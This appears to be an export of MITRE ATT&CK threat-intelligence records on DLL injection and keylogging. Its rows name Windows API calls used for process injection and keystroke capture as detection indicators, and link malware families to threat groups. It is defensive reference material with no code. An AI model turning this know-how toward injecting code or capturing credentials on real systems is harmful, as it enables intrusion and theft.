868,"['Monitoring API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique.\n\nMonitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using [[Technique/T1086|PowerShell]] with tools such as PowerSploit,[[CiteRef::Powersploit]] so additional PowerShell monitoring may be required to cover known implementations of this behavior.']","['Process whitelisting', 'Anti-virus']",[],[],"['API monitoring', 'Windows Registry', 'File monitoring', 'Process monitoring']","[u'After decrypting itself in memory, [[Software/S0055|RARSTONE]] downloads a DLL file from its C2 server and loads it in the memory space of a hidden Internet Explorer process. This \u201cdownloaded\u201d file is actually not dropped onto the system.[[CiteRef::Camba RARSTONE]]']",['Naikon'],['Naikon'],['G0019'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identification of subsequent malicious behavior. \n\nIdentify or block potentially malicious software that may contain DLL injection functionality by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: RARSTONE,"['Defense Evasion', 'Privilege Escalation']",['Technique/T1055'],['DLL Injection'],https://attack.mitre.org/wiki/Technique/T1055
869,"['Monitoring API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique.\n\nMonitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using [[Technique/T1086|PowerShell]] with tools such as PowerSploit,[[CiteRef::Powersploit]] so additional PowerShell monitoring may be required to cover known implementations of this behavior.']","['Process whitelisting', 'Anti-virus']",[],[],"['API monitoring', 'Windows Registry', 'File monitoring', 'Process monitoring']",['[[Software/S0012|PoisonIvy]] can load DLLs.[[CiteRef::FireEye Poison Ivy]]'],['admin@338'],['admin@338'],['G0018'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identification of subsequent malicious behavior. \n\nIdentify or block potentially malicious software that may contain DLL injection functionality by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: PoisonIvy, Poison Ivy","['Defense Evasion', 'Privilege Escalation']",['Technique/T1055'],['DLL Injection'],https://attack.mitre.org/wiki/Technique/T1055
870,"['Monitoring API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique.\n\nMonitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using [[Technique/T1086|PowerShell]] with tools such as PowerSploit,[[CiteRef::Powersploit]] so additional PowerShell monitoring may be required to cover known implementations of this behavior.']","['Process whitelisting', 'Anti-virus']",[],[],"['API monitoring', 'Windows Registry', 'File monitoring', 'Process monitoring']",['[[Software/S0154|Cobalt Strike]] can inject a variety of payloads into processes dynamically chosen by the adversary.[[CiteRef::cobaltstrike manual]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identification of subsequent malicious behavior. \n\nIdentify or block potentially malicious software that may contain DLL injection functionality by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: Cobalt Strike,"['Defense Evasion', 'Privilege Escalation']",['Technique/T1055'],['DLL Injection'],https://attack.mitre.org/wiki/Technique/T1055
871,"['Monitoring API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique.\n\nMonitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using [[Technique/T1086|PowerShell]] with tools such as PowerSploit,[[CiteRef::Powersploit]] so additional PowerShell monitoring may be required to cover known implementations of this behavior.']","['Process whitelisting', 'Anti-virus']",[],[],"['API monitoring', 'Windows Registry', 'File monitoring', 'Process monitoring']",['[[Software/S0093|Backdoor.Oldrea]] injects itself into explorer.exe.[[CiteRef::Symantec Dragonfly]]'],['Dragonfly'],"['Dragonfly', 'Energetic Bear']",['G0035'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identification of subsequent malicious behavior. \n\nIdentify or block potentially malicious software that may contain DLL injection functionality by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: Backdoor.Oldrea, Havex","['Defense Evasion', 'Privilege Escalation']",['Technique/T1055'],['DLL Injection'],https://attack.mitre.org/wiki/Technique/T1055
872,"['Monitoring API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique.\n\nMonitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using [[Technique/T1086|PowerShell]] with tools such as PowerSploit,[[CiteRef::Powersploit]] so additional PowerShell monitoring may be required to cover known implementations of this behavior.']","['Process whitelisting', 'Anti-virus']",[],[],"['API monitoring', 'Windows Registry', 'File monitoring', 'Process monitoring']",['[[Software/S0012|PoisonIvy]] can load DLLs.[[CiteRef::FireEye Poison Ivy]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identification of subsequent malicious behavior. \n\nIdentify or block potentially malicious software that may contain DLL injection functionality by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: PoisonIvy, Poison Ivy","['Defense Evasion', 'Privilege Escalation']",['Technique/T1055'],['DLL Injection'],https://attack.mitre.org/wiki/Technique/T1055
873,"['Monitoring API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique.\n\nMonitor processes and command-line arguments for actions that could be done before or after code injection has occurred and correlate the information with related event information. Code injection may also be performed using [[Technique/T1086|PowerShell]] with tools such as PowerSploit,[[CiteRef::Powersploit]] so additional PowerShell monitoring may be required to cover known implementations of this behavior.']","['Process whitelisting', 'Anti-virus']",[],[],"['API monitoring', 'Windows Registry', 'File monitoring', 'Process monitoring']",['[[Software/S0012|PoisonIvy]] can load DLLs.[[CiteRef::FireEye Poison Ivy]]'],['Molerats'],"['Molerats', 'Gaza cybergang', 'Operation Molerats']",['G0021'],"['Mitigating specific API calls will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identification of subsequent malicious behavior. \n\nIdentify or block potentially malicious software that may contain DLL injection functionality by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: PoisonIvy, Poison Ivy","['Defense Evasion', 'Privilege Escalation']",['Technique/T1055'],['DLL Injection'],https://attack.mitre.org/wiki/Technique/T1055
874,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['Malware used by [[Group/G0043|Group5]] is capable of capturing keystrokes.[[CiteRef::Citizen Lab Group5]]'],['Group5'],['Group5'],['G0043'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],[],"['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
875,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['The [[Software/S0032|gh0st]] RAT has a keylogger.[[CiteRef::Alintanahin 2014]]'],['PittyTiger'],['PittyTiger'],['G0011'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],Software: gh0st,"['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
876,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Software/S0012|PoisonIvy]] contains a keylogger.[[CiteRef::FireEye Poison Ivy]]'],['PittyTiger'],['PittyTiger'],['G0011'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],"Software: PoisonIvy, Poison Ivy","['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
877,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Software/S0030|Carbanak]] contains keylogger functionality.[[CiteRef::Kaspersky Carbanak]]'],['Carbanak'],"['Carbanak', 'Anunak']",['G0008'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],"Software: Carbanak, Anunak","['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
878,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Software/S0030|Carbanak]] contains keylogger functionality.[[CiteRef::Kaspersky Carbanak]]'],['FIN7'],['FIN7'],['G0046'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],"Software: Carbanak, Anunak","['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
879,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['The [[Software/S0032|gh0st]] RAT has a keylogger.[[CiteRef::Alintanahin 2014]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],Software: gh0st,"['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
880,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Software/S0070|HTTPBrowser]] is capable of capturing keystrokes on victims.[[CiteRef::Dell TG-3390]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],"Software: HTTPBrowser, Token Control, HttpDump","['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
881,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Software/S0125|Remsec]] contains a keylogger component.[[CiteRef::Symantec Remsec IOCs]][[CiteRef::Kaspersky ProjectSauron Technical Analysis]]'],['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],"Software: Remsec, Backdoor.Remsec, ProjectSauron","['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
882,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']","['When it first starts, [[Software/S0128|BADNEWS]] spawns a new thread to log keystrokes.[[CiteRef::Forcepoint Monsoon]]']",['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],Software: BADNEWS,"['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
883,"['Keyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsynceyState.[[CiteRef::Adventures of a Keystroke]] Monitor the Registry and file system for such changes and detect driver installs, as well as looking for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\nMonitor the Registry for the addition of a Custom Credential Provider.[[CiteRef::Wrightson 2012]] Detection of compromised [[Technique/T1078|Valid Accounts]] in use by adversaries may help to catch the result of user input interception if new techniques are used.']",[],['569'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Registry', 'Kernel drivers', 'Process monitoring', 'API monitoring']",['[[Software/S0130|Unknown Logger]] is capable of recording keystrokes.[[CiteRef::Forcepoint Monsoon]]'],['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['Identify and block potentially malicious software that may be used to acquire credentials or information from the user by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIn cases where this behavior is difficult to detect or mitigate, efforts can be made to lessen some of the impact that might result from an adversary acquiring credential information. It is also good practice to follow mitigation recommendations for adversary use of [[Technique/T1078|Valid Accounts]].']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['Administrator', 'SYSTEM']",[],Software: Unknown Logger,"['Collection', 'Credential Access']",['Technique/T1056'],['Input Capture'],https://attack.mitre.org/wiki/Technique/T1056
